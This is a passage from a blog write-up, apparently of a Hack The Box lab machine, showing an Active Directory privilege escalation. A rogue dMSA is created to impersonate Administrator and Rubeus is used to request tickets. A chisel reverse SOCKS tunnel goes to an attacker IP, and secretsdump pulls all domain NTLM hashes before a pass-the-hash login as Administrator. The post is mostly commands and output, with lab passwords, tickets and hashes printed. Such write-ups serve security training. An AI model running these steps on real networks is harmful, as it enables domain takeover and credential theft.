class="string">&quot;OU=Staff,DC=eighteen,DC=htb&quot;</span> <span class="literal">-Name</span> <span class="string">&quot;bad_DMSA&quot;</span> <span class="literal">-DelegatedAdmin</span> <span class="string">&quot;adam.scott&quot;</span> <span class="literal">-DelegateTarget</span> <span class="string">&quot;Administrator&quot;</span> <span class="literal">-domain</span> <span class="string">&quot;eighteen.htb&quot;</span></span><br><span class="line">Creating dMSA at: LDAP://eighteen.htb/OU=Staff,DC=eighteen,DC=htb</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line">Successfully created and configured dMSA <span class="string">&#x27;bad_DMSA&#x27;</span></span><br><span class="line">Object adam.scott can now impersonate Administrator</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取当前用户</span></span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\adam.scott\Documents&gt; .\Rubeus.exe asktgt /user:adam.scott /password:iloveyou1 /opsec /nowrap /force</span><br><span class="line"></span><br><span class="line">   ______        _</span><br><span class="line">  (_____ \      | |</span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___</span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.<span class="number">3.3</span></span><br><span class="line"></span><br><span class="line">[*] Action: Ask TGT</span><br><span class="line"></span><br><span class="line">[*] Got domain: eighteen.htb</span><br><span class="line">[*] <span class="keyword">Using</span> domain controller: DC01.eighteen.htb (fe80::214d:667:a861:ca2a%3)</span><br><span class="line">[!] Pre<span class="literal">-Authentication</span> required!</span><br><span class="line">[!]     AES256 Salt: EIGHTEEN.HTBadam.scott</span><br><span class="line">[*] <span class="keyword">Using</span> rc4_hmac hash: 9964DAE494A77414E34AFF4F34412166</span><br><span class="line">[*] Building AS<span class="literal">-REQ</span> (w/ preauth) <span class="keyword">for</span>: <span class="string">&#x27;eighteen.htb\adam.scott&#x27;</span></span><br><span class="line">[*] <span class="keyword">Using</span> domain controller: fe80::214d:667:a861:ca2a%3:88</span><br><span class="line">[+] TGT request successful!</span><br><span class="line"><span class="function">[*] <span class="title">base64</span></span>(ticket.kirbi):</span><br><span class="line"></span><br><span class="line">      doIFpjCCBaKgAwIBBaEDAgEWooIEqTCCBKVhggShMIIEnaADAgEFoQ4bDEVJR0hURUVOLkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMRUlHSFRFRU4uSFRCo4IEYTCCBF2gAwIBEqEDAgECooIETwSCBEt8MPAlqHpLiCcfqwwy+<span class="number">42</span>xeRUZLCu/JVspQD43<span class="built_in">cP</span>+<span class="number">7</span>aBgp4w5vUTNETHHmbC6N9Nth/pCYoXGgyHjgCcnyLl4vS2aQoIhWg2CCTiV/wKRJLr1c45pFb8gxrU4xCOHYdPzSUY7bz4ioPcfeGqyIZ2lv8RA0/HyVBizuOG+<span class="number">72</span>qKA6lFgCqVWERhvueZ6W9SlMzhxMcT+ZKSESq3eUxPvJWOq7WlU5UHBtqtEw4MZ7ac5JigtVFqf21v3R7tBPOQ1ryyqZuaUjOyWNlF/<span class="number">43</span>nRaUmWNonjfVVYYMcYV7O2QTglTjOJevPIfAis2RTgwwdiy/O38uWPzYqO+gMCodJ/tApREny2dDPbrzTYfJhMULXKWqp0ZLdGiFP9BGXwo8YNAvnfLtYNXZvjEtRvxfelQ+u5y4ay40EugPtU/N48YZx/fIShO226kU/<span class="number">0</span>N4Q0YYFQgXjaxHYCTJOt5I1jMmj0AVz3bQW0tQDUyrF0hy196aT2E7R5bVyP7JCFp0sARSaiJplq6ahPBEemn8zNlwT+vTSV2fmZKNoffYyupnHkXOtwmMTtAvSCRZ/H5GDUZKIzw00YiOyL2yqyedXbmpaGysKptZ79NX/beb/DL82nnIFpUB0i21ALYyp1q5U4s6l2Zo633mTDyabkbi7kJWreCRlh1hv9bk5CzCb4enSi0LdWCpM8WsR+/D6mLk7tdTO5MA+<span class="number">17</span>RnqPjmTkog9HwB+Pbo/NZjZgSCmL1cZW6g+iqtZaa5CHfCTSEud7KpTvmkhtWpq4ly9oOCYnbLZx9uOyJrnwY8pq9uHpFRgcreP8Q+rl35xTJvlLFU0ff6PvgFXwWIPhSGfl6vMDDczhn2RzgzoVXVuuXb63a1/HI9EdYrcBo9N9eZmNy8eyhrVkMQ0arTJCud8VTki3W6Wibd0EhvGZTnEb6GH+G61Jf1i7TkhSrjHUYfpI/bkW9NuK8iwwTIhao+<span class="number">9</span>XbevMlbgTIUAkMH8BRHsibrV9AtVnvHl2Zop37s1l+dbjtkpz6XLYtDNcE4t2GuMXqHVYwhHLrKcU3z9alDYWMSPl8Rls+rf9vrTzir1/OgU5a0bU/QZiSHgtqQ6mrQeu/EzeUXGIq6D5f/hObGueRJdC1Dp79WsaizqNUPAj2jIuMwA1WqFz6XgPZFpOrTiraPEGwdy4SerVlWcETdf3M62qljovcsjlooMTJFfKQq1j1<span class="built_in">r</span>+y2iPSxI6KJgbq7o3yVQPAYcUj3lPxnSfBMYYPCNJdI/VLBSMD+Jm+<span class="number">67</span>MWZNM4jRwT+<span class="number">1</span>NqmzhnLEmibspLLmrZ05kdvIEac0G+RduaWnQX0YU5dhHMQi413WXeTRUJdszw5Bt55+<span class="number">4</span>QQTJ3yD0PYthqGIQduX7p96IOHp7sbRlWASOVHbWksbj6OX8Eec3sFRQXUFITqv9leIJdTbajTjAxrnA8FkKbfgYkFJiKAgbpAEEqqgIjvlPoeDdTsR64fCAl+<span class="number">11</span>o4HoMIHloAMCAQCigd0Egdp9gdcwgdSggdEwgc4wgcugKzApoAMCARKhIgQg/Bn7bJNCwC3SIkDqc/h9fEmnbkurm2zAFG6VMcy0KjmhDhsMRUlHSFRFRU4uSFRCohcwFaADAgEBoQ4wDBsKYWRhbS5zY290dKMHAwUAQOEAAKURGA8yMDI1MTEyMTIwMTQ0OVqmERgPMjAyNTExMjIwNjE0NDlapxEYDzIwMjUxMTI4MjAxNDQ5WqgOGwxFSUdIVEVFTi5IVEKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDEVJR0hURUVOLkhUQg==</span><br><span class="line"></span><br><span class="line">  ServiceName              :  krbtgt/EIGHTEEN.HTB</span><br><span class="line">  ServiceRealm             :  EIGHTEEN.HTB</span><br><span class="line">  UserName                 :  adam.scott (NT_PRINCIPAL)</span><br><span class="line">  UserRealm                :  EIGHTEEN.HTB</span><br><span class="line">  StartTime                :  <span class="number">11</span>/<span class="number">21</span>/<span class="number">2025</span> <span class="number">12</span>:<span class="number">14</span>:<span class="number">49</span> PM</span><br><span class="line">  EndTime                  :  <span class="number">11</span>/<span class="number">21</span>/<span class="number">2025</span> <span class="number">10</span>:<span class="number">14</span>:<span class="number">49</span> PM</span><br><span class="line">  RenewTill                :  <span class="number">11</span>/<span class="number">28</span>/<span class="number">2025</span> <span class="number">12</span>:<span class="number">14</span>:<span class="number">49</span> PM</span><br><span class="line">  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable</span><br><span class="line">  KeyType                  :  aes256_cts_hmac_sha1</span><br><span class="line">  Base64(key)              :  /Bn7bJNCwC3SIkDqc/h9fEmnbkurm2zAFG6VMcy0Kjk=</span><br><span class="line">  ASREP (key)              :  <span class="number">9964</span>DAE494A77414E34AFF4F34412166</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 krbtgt 票据</span></span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\adam.scott\Documents&gt; .\Rubeus.exe asktgs /targetuser:bad_DMSA<span class="variable">$</span> /service:krbtgt/eighteen.htb /opsec /dmsa /nowrap /ptt /ticket:doIFpjCCBaKgAwIBBaEDAgEWooIEqTCCBKVhggShMIIEnaADAgEFoQ4bDEVJR0hURUVOLkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMRUlHSFRFRU4uSFRCo4IEYTCCBF2gAwIBEqEDAgECooIETwSCBEt8MPAlqHpLiCcfqwwy+<span class="number">42</span>xeRUZLCu/JVspQD43<span class="built_in">cP</span>+<span class="number">7</span>aBgp4w5vUTNETHHmbC6N9Nth/pCYoXGgyHjgCcnyLl4vS2aQoIhWg2CCTiV/wKRJLr1c45pFb8gxrU4xCOHYdPzSUY7bz4ioPcfeGqyIZ2lv8RA0/HyVBizuOG+<span class="number">72</span>qKA6lFgCqVWERhvueZ6W9SlMzhxMcT+ZKSESq3eUxPvJWOq7WlU5UHBtqtEw4MZ7ac5JigtVFqf21v3R7tBPOQ1ryyqZuaUjOyWNlF/<span class="number">43</span>nRaUmWNonjfVVYYMcYV7O2QTglTjOJevPIfAis2RTgwwdiy/O38uWPzYqO+gMCodJ/tApREny2dDPbrzTYfJhMULXKWqp0ZLdGiFP9BGXwo8YNAvnfLtYNXZvjEtRvxfelQ+u5y4ay40EugPtU/N48YZx/fIShO226kU/<span class="number">0</span>N4Q0YYFQgXjaxHYCTJOt5I1jMmj0AVz3bQW0tQDUyrF0hy196aT2E7R5bVyP7JCFp0sARSaiJplq6ahPBEemn8zNlwT+vTSV2fmZKNoffYyupnHkXOtwmMTtAvSCRZ/H5GDUZKIzw00YiOyL2yqyedXbmpaGysKptZ79NX/beb/DL82nnIFpUB0i21ALYyp1q5U4s6l2Zo633mTDyabkbi7kJWreCRlh1hv9bk5CzCb4enSi0LdWCpM8WsR+/D6mLk7tdTO5MA+<span class="number">17</span>RnqPjmTkog9HwB+Pbo/NZjZgSCmL1cZW6g+iqtZaa5CHfCTSEud7KpTvmkhtWpq4ly9oOCYnbLZx9uOyJrnwY8pq9uHpFRgcreP8Q+rl35xTJvlLFU0ff6PvgFXwWIPhSGfl6vMDDczhn2RzgzoVXVuuXb63a1/HI9EdYrcBo9N9eZmNy8eyhrVkMQ0arTJCud8VTki3W6Wibd0EhvGZTnEb6GH+G61Jf1i7TkhSrjHUYfpI/bkW9NuK8iwwTIhao+<span class="number">9</span>XbevMlbgTIUAkMH8BRHsibrV9AtVnvHl2Zop37s1l+dbjtkpz6XLYtDNcE4t2GuMXqHVYwhHLrKcU3z9alDYWMSPl8Rls+rf9vrTzir1/OgU5a0bU/QZiSHgtqQ6mrQeu/EzeUXGIq6D5f/hObGueRJdC1Dp79WsaizqNUPAj2jIuMwA1WqFz6XgPZFpOrTiraPEGwdy4SerVlWcETdf3M62qljovcsjlooMTJFfKQq1j1<span class="built_in">r</span>+y2iPSxI6KJgbq7o3yVQPAYcUj3lPxnSfBMYYPCNJdI/VLBSMD+Jm+<span class="number">67</span>MWZNM4jRwT+<span class="number">1</span>NqmzhnLEmibspLLmrZ05kdvIEac0G+RduaWnQX0YU5dhHMQi413WXeTRUJdszw5Bt55+<span class="number">4</span>QQTJ3yD0PYthqGIQduX7p96IOHp7sbRlWASOVHbWksbj6OX8Eec3sFRQXUFITqv9leIJdTbajTjAxrnA8FkKbfgYkFJiKAgbpAEEqqgIjvlPoeDdTsR64fCAl+<span class="number">11</span>o4HoMIHloAMCAQCigd0Egdp9gdcwgdSggdEwgc4wgcugKzApoAMCARKhIgQg/Bn7bJNCwC3SIkDqc/h9fEmnbkurm2zAFG6VMcy0KjmhDhsMRUlHSFRFRU4uSFRCohcwFaADAgEBoQ4wDBsKYWRhbS5zY290dKMHAwUAQOEAAKURGA8yMDI1MTEyMTIwMTQ0OVqmERgPMjAyNTExMjIwNjE0NDlapxEYDzIwMjUxMTI4MjAxNDQ5WqgOGwxFSUdIVEVFTi5IVEKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDEVJR0hURUVOLkhUQg== /outfile:ticket.kirbi</span><br><span class="line"></span><br><span class="line">   ______        _</span><br><span class="line">  (_____ \      | |</span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___</span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.<span class="number">3.3</span></span><br><span class="line"></span><br><span class="line">[*] Action: Ask TGS</span><br><span class="line"></span><br><span class="line">[*] Requesting default etypes (RC4_HMAC, AES[<span class="number">128</span>/<span class="number">256</span>]_CTS_HMAC_SHA1) <span class="keyword">for</span> the service ticket</span><br><span class="line">[*] Building DMSA TGS<span class="literal">-REQ</span> request <span class="keyword">for</span> <span class="string">&#x27;bad_DMSA$&#x27;</span> from <span class="string">&#x27;adam.scott&#x27;</span></span><br><span class="line">[+] Sequence number is: <span class="number">751902089</span></span><br><span class="line">[*] <span class="keyword">Using</span> domain controller: DC01.eighteen.htb (fe80::214d:667:a861:ca2a%3)</span><br><span class="line">[+] TGS request successful!</span><br><span class="line">[+] Ticket successfully imported!</span><br><span class="line"><span class="function">[*] <span class="title">base64</span></span>(ticket.kirbi):</span><br><span class="line"></span><br><span class="line">      doIFzDCCBcigAwIBBaEDAgEWooIE0DCCBMxhggTIMIIExKADAgEFoQ4bDEVJR0hURUVOLkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMRUlHSFRFRU4uSFRCo4IEiDCCBISgAwIBEqEDAgECooIEdgSCBHJ9ex6NsK6AxfpCczVqOm8ZjD+VUhFsf94QlFn4ejsJ8IBl5kvI7fi8F8pAxcjQJOqwbWa9xoi5ZV3mM7q/JEt3dPwgDyJuwKUyJY5s1ea1V44NbJdZBN6pZsbeE0iHut+uV8iHAomOG12DUcBhwLTZpKH6xKEowW3aTZjy6b/H4ni85e8tVEPBISGsBFwl8MUKbSFeTgKY8J3phn61f8xjTU6cqStE4+<span class="number">061</span>ygQ2+j6uUY41KWO68J57jhKrpNFVNmZPmA94NUv71A2M+<span class="number">0</span>d+<span class="number">7</span>A7Z6nKgC+Okuy3a3Ebqeot1m8LtlJ4hDaYOq84XDrxjqmciUVXnPkU/VQo3fhm7HCbidpc8/<span class="number">3</span>LYYBb18ijaxoP/Zuj+LJB5wy8XdB2cC+OGWsEivtEqx9pPwGjazX0dnarT0QPV8BEAbeSf4s/MYywQQco2lnPUR5JPUesQ3bYZIfq+<span class="number">7</span>htmQVGh/qIdC0ENEYPNMGp2qNGeeqfi85SgbjxHLf5IduVpebRkh6iiRaDqLsx5gW2eoiw67gxwAu5pd/nfBlS5HSSklx6V0u7Mp3B02KQADxZ7t3EgeWuQivGeS2lURKaWuOexGLpsNrFaNtVMFfpp13TqMsMn4CC5u6nNRgh5AEpxzSK8ag2sAY1yXsaELTiszRDPhlLoW+USR6ZJ3J9ZXEWvjE9ktxheCIDNy9o8xQP6XaxMVkXQw5Ajf+GMDYwBulkHhDN3cc4IvVghdXo0oIiaq2qgdpF2sdVL0FXrR6Cbpc6QH0+<span class="number">0</span>lLxMKaKe2tMbpzbG424Wyaf/GKD/jpDMlOLOOB6mDR/OC2qJFmKbFOW5kHuFwUQuGfLCNi5qnR9igZPCTAIjaU/IcnwN/UQNGID14y5rynP+kjFbJMCUfdrlnEbcNKeMrjqUsI2TpuFd6B9iUyVgxHUJZuUk3Pz8X/jw6+MrGP708R5yGFgCS5PCWRY7OK4Z5ZUjrgJ31s9WTrGelIehJ7WI/mGyXN5nfxqKxNs1vnwiQaNloMzSjd8PXCx0dySh3Hf4QlvQgP0WnDzjoqvDDwDfedjYlJv4+bZwJ8YPDqlF6dvNK5wTB1dq4m7w64cG665NsUweF1IcuNu0ABbrvQg9KbudhmyUY6VybxxIih+StgQNIZG5YZ42UFidG661HsvG1CUrk8H4Bs3S0txHcH1NWn//dyjDZHfIWn4qFZtmWZOB5a8dQ5uN/zqgb4nilwSMIu3tHKGW4pg1G1DAnxifm87PgzWEu4hZeYiNkyZ9orRlR0/u2zGyczEkVNso7dcQzpt5kQGWry4B87dQV21vFt43+<span class="number">9</span>sasTF4CYYtcCsB4oVGzGn8dzhGGc5oZ2Lovj7G/<span class="number">6</span>ljiSjZyQT09xJLqk8MlTfCP44gzx1sMH+hPaWBWt0YlhybeV226EC5eKMTOzbmnPEWWbruET9btCzKAqKz+<span class="built_in">H</span>+OpqGD/UU41XodI25wFpppTHzZw9+smu9lEhppnpyWmvQBMsKnQHk7ZSP+AVlshvnHnNP22i6v4Tq/JpqL/<span class="number">9</span>yXxtuo4HnMIHkoAMCAQCigdwEgdl9gdYwgdOggdAwgc0wgcqgKzApoAMCARKhIgQgJsjHzrIGUou5+<span class="number">3</span>d96zmlzqcMXC3mh7bwvaSow4hErSOhDhsMZWlnaHRlZW4uaHRiohYwFKADAgEBoQ0wCxsJYmFkX0RNU0EkowcDBQBAoQAApREYDzIwMjUxMTIxMjAyMDU3WqYRGA8yMDI1MTEyMTIwMzU1N1qnERgPMjAyNTExMjgyMDE0NDlaqA4bDEVJR0hURUVOLkhUQqkhMB+gAwIBAqEYMBYbBmtyYnRndBsMRUlHSFRFRU4uSFRC</span><br><span class="line"></span><br><span class="line">  ServiceName              :  krbtgt/EIGHTEEN.HTB</span><br><span class="line">  ServiceRealm             :  EIGHTEEN.HTB</span><br><span class="line">  UserName                 :  bad_DMSA<span class="variable">$</span> (NT_PRINCIPAL)</span><br><span class="line">  UserRealm                :  eighteen.htb</span><br><span class="line">  StartTime                :  <span class="number">11</span>/<span class="number">21</span>/<span class="number">2025</span> <span class="number">12</span>:<span class="number">20</span>:<span class="number">57</span> PM</span><br><span class="line">  EndTime                  :  <span class="number">11</span>/<span class="number">21</span>/<span class="number">2025</span> <span class="number">12</span>:<span class="number">35</span>:<span class="number">57</span> PM</span><br><span class="line">  RenewTill                :  <span class="number">11</span>/<span class="number">28</span>/<span class="number">2025</span> <span class="number">12</span>:<span class="number">14</span>:<span class="number">49</span> PM</span><br><span class="line">  Flags                    :  name_canonicalize, pre_authent, renewable, forwardable</span><br><span class="line">  KeyType                  :  aes256_cts_hmac_sha1</span><br><span class="line">  Base64(key)              :  JsjHzrIGUou5+<span class="number">3</span>d96zmlzqcMXC3mh7bwvaSow4hErSM=</span><br><span class="line">  Current Keys <span class="keyword">for</span> bad_DMSA<span class="variable">$</span>: (aes256_cts_hmac_sha1) <span class="number">4</span>F55545B8D1E3F1E0B70A19738C1B631CFDFE2867F6E25027CA400BF4F7FB7E2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Ticket written to ticket.kirbi</span><br></pre></td></tr></table></figure>
+
+<p>配置代理</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./chisel server --socks5 --reverse --port 8080</span><br><span class="line">./chisel.exe client 10.10.16.102:8080 R:socks</span><br></pre></td></tr></table></figure>
+
+<p>dump hash</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">$ ticketConverter.py ticket.kirbi ticket.ccache</span><br><span class="line">$ <span class="built_in">export</span> KRB5CCNAME=ticket.ccache </span><br><span class="line">$ faketime -f <span class="string">&quot;+7h&quot;</span> proxychains secretsdump.py eighteen.htb/bad_dmsa\<span class="variable">$@dc01</span>.eighteen.htb -k -no-pass -just-dc-ntlm </span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.16</span><br><span class="line">/root/.local/pipx/venvs/impacket/lib/python3.10/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated <span class="keyword">for</span> removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.</span><br><span class="line">  import pkg_resources</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01.eighteen.htb:445  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  EIGHTEEN.HTB:88  ...  OK</span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01.eighteen.htb:135  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01.eighteen.htb:49676  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  EIGHTEEN.HTB:88  ...  OK</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:0b133be956bfaddf9cea56701affddec:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a7c7a912503b16d8402008c1aebdb649:::</span><br><span class="line">mssqlsvc:1601:aad3b435b51404eeaad3b435b51404ee:c44d16951b0810e8f3bbade300966ec4:::</span><br><span class="line">eighteen.htb\jamie.dunn:1606:aad3b435b51404eeaad3b435b51404ee:9fbaaf9e93e576187bb840e93971792a:::</span><br><span class="line">eighteen.htb\jane.smith:1607:aad3b435b51404eeaad3b435b51404ee:42554e3213381f9d1787d2dbe6850d21:::</span><br><span class="line">eighteen.htb\alice.jones:1608:aad3b435b51404eeaad3b435b51404ee:43f8a72420ee58573f6e4f453e72843a:::</span><br><span class="line">eighteen.htb\adam.scott:1609:aad3b435b51404eeaad3b435b51404ee:9964dae494a77414e34aff4f34412166:::</span><br><span class="line">eighteen.htb\bob.brown:1610:aad3b435b51404eeaad3b435b51404ee:7e86c41ddac3f95c986e0382239ab1ea:::</span><br><span class="line">eighteen.htb\carol.white:1611:aad3b435b51404eeaad3b435b51404ee:6056d42866209a6744cb6294df075640:::</span><br><span class="line">eighteen.htb\dave.green:1612:aad3b435b51404eeaad3b435b51404ee:7624e4baa9c950aa3e0f2c8b1df72ee9:::</span><br><span class="line">DC01$:1000:aad3b435b51404eeaad3b435b51404ee:d79b6837ac78c51c79aab3d970875584:::</span><br><span class="line">Pwn$:12102:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::</span><br><span class="line">dMSA_Luemmel$:12110:aad3b435b51404eeaad3b435b51404ee:9479c12905374756485f184d31e4ec98:::</span><br><span class="line">kreep_dmsa$:12111:aad3b435b51404eeaad3b435b51404ee:ecb0d2b94a4d11d497c42509ffc7e524:::</span><br><span class="line">bad_DMSA$:12112:aad3b435b51404eeaad3b435b51404ee:1e2c79d68b83d013a3dd668c38cb1b7f:::</span><br><span class="line">kreep_dmsa_new$:12113:aad3b435b51404eeaad3b435b51404ee:51945e4f9686351412afba5c72a34239:::</span><br><span class="line">bad_root$:12114:aad3b435b51404eeaad3b435b51404ee:95f0138bff73b060d09007ca19df9f94:::</span><br><span class="line">bad_root2$:12115:aad3b435b51404eeaad3b435b51404ee:f324fe8324bc6dd8ea3f8cfbe38f8b66:::</span><br><span class="line">web_svc$:12116:aad3b435b51404eeaad3b435b51404ee:7fc0d6fd9a8217facbd7b382508e23aa:::</span><br><span class="line">bad_ps$:12117:aad3b435b51404eeaad3b435b51404ee:51cc217548900e3aa68e38186bc78bcf:::</span><br><span class="line">[*] Cleaning up... </span><br></pre></td></tr></table></figure>
+
+<p>pass the hash</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ faketime -f <span class="string">&quot;+7h&quot;</span> proxychains evil-winrm -i <span class="variable">$IP</span> -u Administrator --<span class="built_in">hash</span> 0b133be956bfaddf9cea56701affddec</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator&gt; <span class="built_in">type</span> desktop\root.txt</span><br><span class="line">87ce69fde501eed974cfa6cdd5418b11</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/11/03/Season9-Giveback/" rel="prev" title="[Season9] Giveback WP">
+                  <i class="fa fa-angle-left"></i> [Season9] Giveback WP
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">l1nk</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/mist/" rel="noopener" target="_blank">NexT.Mist</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
